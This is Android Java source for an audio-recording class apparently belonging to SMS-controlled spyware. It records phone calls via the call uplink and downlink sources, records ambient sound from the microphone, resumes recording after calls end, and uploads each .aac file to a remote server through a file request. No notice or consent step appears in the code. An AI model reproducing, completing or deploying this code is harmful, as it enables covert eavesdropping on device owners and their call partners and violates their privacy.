package com.inet.android.audio;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.media.MediaRecorder;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Log;

import com.inet.android.request.ConstantValue;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;
import com.loopj.android.http.RequestParams;

/**
 * RecordAudio class is designed to record audio after command
 * smsBroadcastReceiver
 * 
 * @author johny homicide
 * 
 */
public final class RecordAudioV2 {

	private static MediaRecorder mMediaRecorder;
	private static String time;
	private static final String mPathName = "data";

	// Thread pool
	private static ExecutorService mThreadPool = Executors.newCachedThreadPool();;
	public static AtomicBoolean mRecording = new AtomicBoolean(false);
	private static String outputFileName;
	private static String LOG_TAG = RecordAudioV2.class.getSimpleName()
			.toString();
	private final static int SECONDS_PER_MINUTE = 60;
	// private static final int MINUTE_PER_HOUR = 60;
	private static int minute = -1;
	private static int duration = -1;
	private static Context mContext;
	private static SharedPreferences sp;
	
	private final static Object lock = new Object();
	
	private static int recState = 0; // 0 - no rec; 1 - env rec; 2 - call rec; 3 - call env rec
	
	// 1
	public static void startEnvRec(final int minute, final int source, final Context ctx) {
		Log.d(LOG_TAG, "startEnvRec. recState = " + recState);
		recState = 1;
		Log.d(LOG_TAG, "1 recState = " + recState);
		start(minute, source, ctx);
		Log.d(LOG_TAG, "EnvRec started");
	}
	
	// 2
	public static void startCallRec(final int minute, final int source, final Context ctx) {
		Log.d(LOG_TAG, "startCallRec. recState = " + recState);
		stop();
		Log.d(LOG_TAG, "2 recState = " + recState);
		recState = 2;
		start(minute, source, ctx);
		Log.d(LOG_TAG, "CallRec started");
	}
	
	// 3
	private static void startCallEnvRec(final int minute, final int source, final Context ctx) {
		Log.d(LOG_TAG, "startCallEnvRec. recState = " + recState);
		recState = 3;
		Log.d(LOG_TAG, "3 recState = " + recState);
		start(minute, source, ctx);
		Log.d(LOG_TAG, "CallEnvRec started");
	}
	
	private static void stopEnvRec() {
		Log.d(LOG_TAG, "stopEnvRec");
		
		sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		Editor ed = sp.edit();
		Log.d(LOG_TAG, "duration = " + duration + ", minute = " + minute);
		if ((minute - duration) > 0) {
			ed.putInt("duration", minute - duration);
		} else {
			ed.putInt("duration", 0);
		}
		
		ed.putInt("souce_record", 0);
		ed.commit();
		
//		executeStopRecording();
		execStopRec();
		Log.d(LOG_TAG, "after executeStopRecording");
	}
	
	private static void stopCallRec() {
		Log.d(LOG_TAG, "stopCallRec");
//		executeStopRecording();
		execStopRec();
		Log.d(LOG_TAG, "after executeStopRecording");
		
		int minuteAfterCall = ValueWork.getMethod(ConstantValue.RECORD_ENVORIMENT, 
				mContext);

		Logging.doLog(LOG_TAG, "recording is true, minute after: " + minuteAfterCall,
				"recordAudio != null " + minuteAfterCall);

		if (minuteAfterCall == 0) {
			Logging.doLog(LOG_TAG, "minuteAfterCall == 0",
					"minuteAfterCall == 0");
//			RecordAudioV2.checkStateRecord(mContext);
			sp = PreferenceManager
					.getDefaultSharedPreferences(mContext);
			minute = sp.getInt("duration", 0);
			Log.d(LOG_TAG, "duration = " + minute);
			startEnvRec(minute, MediaRecorder.AudioSource.MIC, mContext);
		} else {
//			RecordAudioV2.executeRecording(minuteAfterCall, MediaRecorder.AudioSource.MIC, mContext);
			startCallEnvRec(minuteAfterCall, MediaRecorder.AudioSource.MIC, mContext);
		}
	}
	
	private static void stopCallEnvRec() {
		Log.d(LOG_TAG, "stopCallEnvRec");
		sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		minute = sp.getInt("duration", 0);
		Log.d(LOG_TAG, "duration = " + minute);
		startEnvRec(minute, MediaRecorder.AudioSource.MIC, mContext);
	}
	
	public static void start(final int minute, final int source, final Context ctx) {
		Log.d(LOG_TAG, "start");
		
//		synchronized (lock) {
			mContext = ctx;
//			executeRecording(minute, source, ctx);
			execRec(minute, source, ctx);
//		}
	}
	
	public static void stop() {
		Log.d(LOG_TAG, "stop. recState = " + recState);
		
//		synchronized (lock) {
			switch (recState) {
			case 0:
				Log.d(LOG_TAG, "case 0. recState = " + recState);
				break;
			case 1:
				Log.d(LOG_TAG, "case 1. recState = " + recState);
				stopEnvRec();
				break;
			case 2:
				Log.d(LOG_TAG, "case 2. recState = " + recState);
				stopCallRec();
				break;
			case 3:
				Log.d(LOG_TAG, "case 3. recState = " + recState);
				stopCallEnvRec();
				break;
			default:
				Log.d(LOG_TAG, "case default. recState = " + recState);
				recState = 0;
				break;
			}
//		}
		recState = 0;
		Log.d(LOG_TAG, "after stop cases. recState = " + recState);
	}
	
	/**
	 * Make audio recording without threadpool.
	 * @param minute total time of the record
	 * @param source source of recording
	 * @param ctx
	 */
	private static void execRec(final int minute, final int source,
			final Context ctx) {
		outputFileName = getOutputFileName();
		if (outputFileName != null) {
			Logging.doLog(LOG_TAG, "executeRecording run", 
					"executeRecording run");
			
//			startRecording(minute, source, outputFileName);
			if (getRecorder(minute, source, outputFileName) != null) {
				Log.d(LOG_TAG, "executeRecording getRecord != null");
			} else {
				Log.d(LOG_TAG, "executeRecording getRecord == null");
				return;
			}
			
			// launch the counter
			Logging.doLog(LOG_TAG, "executeRecording mThreadPool.execute",
					"executeRecording mThreadPool.execute");
			Logging.doLog(LOG_TAG, "executeRecording minute = " + minute,
					"executeRecording minute = " + minute);
			mThreadPool.execute(new RecordingCounterUpdater());
		}
	}
	
	/**
	 * Make stopping audio recording without threadpool.
	 * @param minute
	 * @param source
	 * @param ctx
	 */
	private static void execStopRec() {
		if (mMediaRecorder != null) {
			Logging.doLog(LOG_TAG, "executeStopRecording ",	"executeStopRecording ");
			stopRecording();
			mThreadPool.execute(new Runnable() {

				@Override
				public void run() {
					if (outputFileName != null) sendAudio(outputFileName);
					outputFileName = null;
				}
			});
		}
	}
	
	/**
	 * Make audio recording.
	 * @param minute total time of the record
	 * @param source source of recording
	 * @param ctx
	 */
	public synchronized static void executeRecording(final int minute, final int source,
			final Context ctx) {
//		mContext = ctx;
//
//		if (mRecording.get()) {
//			Log.d(LOG_TAG, "executeRecording mRecording = " + mRecording.get());
//			
//			RecordAudioV2.executeStopRecording(source, mContext);
//		} else {
//			Log.d(LOG_TAG, "executeRecording mRecording = " + mRecording.get());
//		}

		mThreadPool = Executors.newCachedThreadPool();
		mThreadPool.execute(new Runnable() {

			@Override
			public void run() {
				outputFileName = getOutputFileName();
				if (outputFileName != null) {
					Logging.doLog(LOG_TAG, "executeRecording run", 
							"executeRecording run");
					
//					startRecording(minute, source, outputFileName);
					if (getRecorder(minute, source, outputFileName) != null) {
						Log.d(LOG_TAG, "executeRecording getRecord != null");
					} else {
						Log.d(LOG_TAG, "executeRecording getRecord == null");
						return;
					}
					
					// launch the counter
					Logging.doLog(LOG_TAG, "executeRecording mThreadPool.execute",
							"executeRecording mThreadPool.execute");
					Logging.doLog(LOG_TAG, "executeRecording minute = " + minute,
							"executeRecording minute = " + minute);
					mThreadPool.execute(new RecordingCounterUpdater());
				}
			}
		});
	}
	
	/**
	 * Make stopping audio recording.
	 */
	public synchronized static void executeStopRecording() {
//		if (mRecording.get()) {
//			Log.d(LOG_TAG, "executeStopRecording1 mRecording.get() = " + mRecording.get());
//		} else {
//			Log.d(LOG_TAG, "executeStopRecording1 mRecording.get() = " + mRecording.get() + ", return");
//			return;
//		}
//		if (RecordAudioV2.mRecording.get()) {
//			RecordAudioV2.executeStopRecording();
//			
//			int minuteAfterCall = ValueWork.getMethod(
//					ConstantValue.RECORD_ENVORIMENT, mContext);
//			
//			Logging.doLog(LOG_TAG, "recording is true, minute after: " + minuteAfterCall,
//					"recordAudio != null " + minuteAfterCall);
//			
//			if (minuteAfterCall == 0) {
//				Logging.doLog(LOG_TAG, "minuteAfterCall == 0",
//						"minuteAfterCall == 0");
//				RecordAudioV2.checkStateRecord(mContext);
//			} else {
//				RecordAudioV2.executeRecording(minuteAfterCall, MediaRecorder.AudioSource.MIC, mContext);
//			}
//		}
		
		mThreadPool.execute(new Runnable() {
			@Override
			public void run() {
				if (mMediaRecorder != null) {
					Logging.doLog(LOG_TAG, "executeStopRecording ",	"executeStopRecording ");
					stopRecording();
					if (outputFileName != null) sendAudio(outputFileName);
					outputFileName = null;
				}

			}
		});
	}

	/**
	 * Make stopping audio recording.
	 * 
	 * @param source
	 * @param mContext
	 */
	public synchronized static void executeStopRecording(final int source,
			final Context mContext) {
		if (mRecording.get()) {
			Log.d(LOG_TAG, "executeStopRecording2 mRecording.get() = " + mRecording.get());
		} else {
			Log.d(LOG_TAG, "executeStopRecording2 mRecording.get() = " + mRecording.get() + " , return");
			return;
		}
		
		mThreadPool.execute(new Runnable() {
			@Override
			public void run() {
				if (mMediaRecorder != null) {
					sp = PreferenceManager
							.getDefaultSharedPreferences(mContext);
					Logging.doLog(LOG_TAG,
							"executeStopRecording source, mContext",
							"executeStopRecording source, mContext");

					Editor ed = sp.edit();
					Log.d(LOG_TAG, "duration = " + (minute - duration));
					ed.putInt("duration", minute - duration);
					ed.putInt("souce_record", source);
					ed.commit();

					stopRecording();
					if (outputFileName != null)
						sendAudio(outputFileName);
					outputFileName = null;
					executeRecording(-1, source, mContext);
				}
			}
		});
	}

	/**
	 * ][zwid
	 * 
	 * @param min
	 * @param source
	 * @param fileName
	 * @return
	 */
	private static MediaRecorder getRecorder(int min, int source,
			String fileName) {
		if (min != -1) {
			minute = min * SECONDS_PER_MINUTE;
		}		

//		if (mMediaRecorder == null) {
			Log.d(LOG_TAG, "mMediaRecorder = " + mMediaRecorder);
			Log.d(LOG_TAG, "source = " + source + ", minute = " + minute);

			mMediaRecorder = new MediaRecorder();
			
			Log.d(LOG_TAG, "mMediaRecorder = " + mMediaRecorder);
			
			switch (source) {
			case 1:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
				break;
			case 2:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_UPLINK);
				break;
			case 3:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK);
				break;
			case 4:
				Log.d(LOG_TAG, "source case 4");
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
				break;
			case 5:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
				break;
			case 6:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
				break;
			default:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
				break;
			}

			mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
			mMediaRecorder.setOutputFile(fileName);
			mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
			mMediaRecorder.setAudioEncodingBitRate(16);
			mMediaRecorder.setAudioSamplingRate(44100);
			mMediaRecorder.setOnErrorListener(new RecorderErrorListener());
//		} else {
//			Log.d(LOG_TAG, "mMediaRecorder = " + mMediaRecorder);
//
//			mMediaRecorder.stop();
//			mMediaRecorder.reset();
//			mMediaRecorder.release();
//			mMediaRecorder = null;
//			return null;
//		}

		
		try {
			mMediaRecorder.prepare();
			mMediaRecorder.start();
			
			Logging.doLog(LOG_TAG, "mMediaRecorder.start()",
					"mMediaRecorder.start()");
		} catch (IllegalStateException e) {
			Logging.doLog(LOG_TAG,
					"IllegalStateException thrown while trying to record a greeting");
			e.printStackTrace();
//			mMediaRecorder.stop();
//			mMediaRecorder.reset();
//			mMediaRecorder.release();
			mMediaRecorder = null;
		} catch (IOException e) {
			Logging.doLog(LOG_TAG,
					"IOException thrown while trying to record a greeting");
			e.printStackTrace();
//			mMediaRecorder.stop();
//			mMediaRecorder.reset();
//			mMediaRecorder.release();
			mMediaRecorder = null;
		} catch (RuntimeException e) {
			e.printStackTrace();
			if (source != 6) {
				Log.d(LOG_TAG, "Runtimeexception. Switch to the source 0");
				getRecorder(minute, MediaRecorder.AudioSource.DEFAULT, fileName);
			} else {
				Log.d(LOG_TAG, "Runtimeexception. Source = 6. Return null. ");
				mRecording.set(false);
				return null;
			}
		}
		mRecording.set(true);
		Log.d(LOG_TAG, "mRecording = " + mRecording.get());
		return mMediaRecorder;
	}
	

	private static void stopRecording() {
		if (mMediaRecorder != null) {
			Logging.doLog(LOG_TAG, "Stopping recording", "Stopping recording");
			mMediaRecorder.stop();
//			mMediaRecorder.reset();
//			mMediaRecorder.release();
//			mMediaRecorder = null;
			mRecording.set(false);
			Log.d(LOG_TAG, "stopRecording mRecording = " + mRecording.get());
		}
	}

	// public void executeStopAfterCallRecordng() {
	// mThreadPool.execute(new RecordingCounterUpdater());
	// }

	public static void checkStateRecord(Context mContext) {
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		int appendRecord = sp.getInt("duration_record", -1);
		
		Log.d(LOG_TAG, "appendRecord: " + appendRecord);
		
		if (appendRecord != -1) {
			executeRecording(appendRecord, sp.getInt("source_record", -1),
					mContext);
			Editor ed = sp.edit();
			ed.putInt("duration", -1);
			ed.commit();
		}
	}

	/**
	 * Creates and gets output file name
	 * 
	 * @return
	 */
	private static String getOutputFileName() {
		// create media file
		String dir = Environment.getExternalStorageDirectory()
				.getAbsolutePath() + File.separator + mPathName;
		File filePath = new File(dir);
		if (!filePath.exists()) {
			filePath.mkdirs();
		}
		time = ConvertDate.logTime();
		String file = dir + "/" + time + ".aac";
		
		Logging.doLog(LOG_TAG, "file " + file, "file " + file);
		
		File audioFile = new File(file);
		try {
			if (!audioFile.exists()) {
				audioFile.createNewFile();
			}
		} catch (IOException e) {
			Logging.doLog(LOG_TAG, "Unable to create media file!",
					"Unable to create media file!");
			e.printStackTrace();
		}

		return audioFile.getAbsolutePath();
	}

	/**
	 * Updates duration counter while recording a message.
	 */
	private static class RecordingCounterUpdater implements Runnable {

		@Override
		public void run() {
			int currentCounter = 0;
			Log.d(LOG_TAG, "1 counterUpdater recState = " + recState);
			while (recState == 0) {
				if (minute != -1)
					postCounterUpdateMessage(currentCounter);
				try {
					Thread.sleep(100);
				} catch (InterruptedException e) {
					// Re-assert the thread's interrupted status
					Thread.currentThread().interrupt();
					return;
				}
				currentCounter++;
				duration = currentCounter / 10;
				Logging.doLog(LOG_TAG, String.format(
						"posting counter update of:%d", currentCounter), String
						.format("posting counter update of:%d", currentCounter));
			}
			Log.d(LOG_TAG, "2 counterUpdater recState = " + recState);
		}
	}

	/**
	 * Posts current position in the voice file to the Handler.
	 */
	private static void postCounterUpdateMessage(int currentPosition) {

		if (currentPosition == minute) {
			Logging.doLog(LOG_TAG, "equals = " + minute, "equals = " + minute);
			stop();
//			executeStopRecording();
		}
	}

	private static void sendAudio(String path) {
		Logging.doLog(LOG_TAG, "sendAudio duration " + duration, "sendAudio "
				+ duration);
		if (!ValueWork.getLastCreateAudioFile().equals(path)) {
			RequestParams params = new RequestParams();
			try {
				params.put("data[][time]", ConvertDate.logTime());
				params.put("data[][type]", ConstantValue.TYPE_AUDIO_REQUEST);
				params.put("data[][duration]", duration);
				params.put("data[][path]", path);
				params.put("key", System.currentTimeMillis());
				params.put("data[][file]", new File(path));
			} catch (FileNotFoundException e) {
				Log.d(LOG_TAG, "FileNotFoundException");
				e.printStackTrace();
			}
			RequestList.sendFileRequest(params, mContext);
		}
	}

	/**
	 * Listener for the MediaRecorder error messages.
	 */
	private static class RecorderErrorListener implements
			android.media.MediaRecorder.OnErrorListener {

		@Override
		public void onError(MediaRecorder mp, int what, int extra) {

			String whatDescription = "";

			switch (what) {
			case MediaRecorder.MEDIA_RECORDER_ERROR_UNKNOWN:
				whatDescription = "MEDIA_RECORDER_ERROR_UNKNOWN";
				break;
			default:
				whatDescription = Integer.toString(what);
				break;
			}
			Logging.doLog(LOG_TAG, String.format(
					"MediaRecorder error occured: %s,%d", whatDescription,
					extra), String.format("MediaRecorder error occured: %s,%d",
					whatDescription, extra));
		}
	}

}